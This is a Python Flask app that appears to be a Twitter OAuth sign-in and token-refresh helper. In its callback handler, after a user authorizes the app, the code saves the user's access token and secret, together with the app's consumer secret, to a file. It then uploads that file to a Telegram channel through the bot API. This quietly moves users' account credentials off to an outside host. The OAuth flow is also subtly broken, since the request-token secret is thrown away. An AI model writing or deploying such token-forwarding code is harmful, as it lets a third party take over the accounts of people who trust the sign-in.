import json
import os
import requests
from requests_oauthlib import OAuth1Session
from dotenv import load_dotenv
from flask import Flask, request, redirect, url_for

# Load environment variables from .env file
load_dotenv()

# Directory to save credentials for multiple users
CREDENTIALS_DIR = "twitter_credentials"

if not os.path.exists(CREDENTIALS_DIR):
    os.makedirs(CREDENTIALS_DIR)

# Environment variable helper
def get_env_variable(var_name):
    value = os.getenv(var_name)
    if value is None:
        raise EnvironmentError(f"Missing required environment variable: {var_name}")
    return value

# Load credentials from JSON file
def load_credentials(username):
    user_credentials_file = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
    if os.path.exists(user_credentials_file):
        with open(user_credentials_file, 'r') as file:
            return json.load(file)
    return None

# Save credentials to JSON file
def save_credentials(username, credentials):
    user_credentials_file = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
    with open(user_credentials_file, 'w') as file:
        json.dump(credentials, file)

# Check if tokens are valid by making a request to Twitter
def are_tokens_valid(credentials):
    oauth = OAuth1Session(
        credentials["consumer_key"],
        client_secret=credentials["consumer_secret"],
        resource_owner_key=credentials["access_token"],
        resource_owner_secret=credentials["access_token_secret"]
    )
    response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
    return response.status_code == 200

# Send file to Telegram channel
def send_file_to_telegram(file_path):
    TELEGRAM_BOT_TOKEN = get_env_variable('TELEGRAM_BOT_TOKEN')
    TELEGRAM_CHANNEL_ID = get_env_variable('TELEGRAM_CHANNEL_ID')
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        payload = {
            'chat_id': TELEGRAM_CHANNEL_ID
        }
        files = {
            'document': file
        }
        response = requests.post(url, data=payload, files=files)
        if response.status_code == 200:
            print("File sent successfully to Telegram.")
        else:
            print(f"Failed to send file to Telegram. Status code: {response.status_code}, Response: {response.text}")

# Re-authenticate the user if tokens are invalid or missing
def re_authenticate_user(username):
    consumer_key = get_env_variable("CONSUMER_KEY")
    consumer_secret = get_env_variable("CONSUMER_SECRET")
    
    oauth = OAuth1Session(consumer_key, client_secret=consumer_secret)
    request_token_url = "https://api.twitter.com/oauth/request_token"
    
    try:
        fetch_response = oauth.fetch_request_token(request_token_url)
        resource_owner_key = fetch_response.get("oauth_token")
        resource_owner_secret = fetch_response.get("oauth_token_secret")
        
        authorization_url = oauth.authorization_url("https://api.twitter.com/oauth/authorize")
        print(f"Redirecting {username} to authorize the app: {authorization_url}")
        
        return redirect(authorization_url)
    
    except Exception as e:
        print(f"Re-authentication failed: {e}")
        return None

# Handle the callback from Twitter after authorization
def handle_callback(oauth_token, oauth_verifier, username):
    consumer_key = get_env_variable("CONSUMER_KEY")
    consumer_secret = get_env_variable("CONSUMER_SECRET")
    
    oauth = OAuth1Session(
        consumer_key,
        client_secret=consumer_secret,
        resource_owner_key=oauth_token
    )
    
    try:
        oauth_tokens = oauth.fetch_access_token("https://api.twitter.com/oauth/access_token", verifier=oauth_verifier)
        access_token = oauth_tokens["oauth_token"]
        access_token_secret = oauth_tokens["oauth_token_secret"]
        
        credentials = {
            "consumer_key": consumer_key,
            "consumer_secret": consumer_secret,
            "access_token": access_token,
            "access_token_secret": access_token_secret
        }
        save_credentials(username, credentials)
        
        # Send the saved credentials file to Telegram
        credentials_file_path = os.path.join(CREDENTIALS_DIR, f"{username}_credentials.json")
        send_file_to_telegram(credentials_file_path)
        
        return credentials
    
    except Exception as e:
        print(f"Error during callback handling: {e}")
        return None

# Flask app initialization
app = Flask(__name__)

@app.route('/')
def index():
    username = "default_user"
    
    credentials = load_credentials(username)
    if not credentials or not are_tokens_valid(credentials):
        # No valid tokens found, initiate re-authentication
        return re_authenticate_user(username)
    
    return f"User '{username}' is authenticated. Ready to access Twitter API."

@app.route('/callback')
def callback():
    oauth_token = request.args.get('oauth_token')
    oauth_verifier = request.args.get('oauth_verifier')
    
    username = "default_user"
    credentials = handle_callback(oauth_token, oauth_verifier, username)
    
    if credentials:
        return f"User '{username}' successfully re-authenticated."
    else:
        return "Failed to authenticate user."

@app.route('/protected')
def protected():
    username = "default_user"
    credentials = load_credentials(username)
    
    if credentials and are_tokens_valid(credentials):
        oauth = OAuth1Session(
            credentials["consumer_key"],
            client_secret=credentials["consumer_secret"],
            resource_owner_key=credentials["access_token"],
            resource_owner_secret=credentials["access_token_secret"]
        )
        response = oauth.get("https://api.twitter.com/1.1/account/verify_credentials.json")
        return response.json()
    
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv("PORT", 5000)))
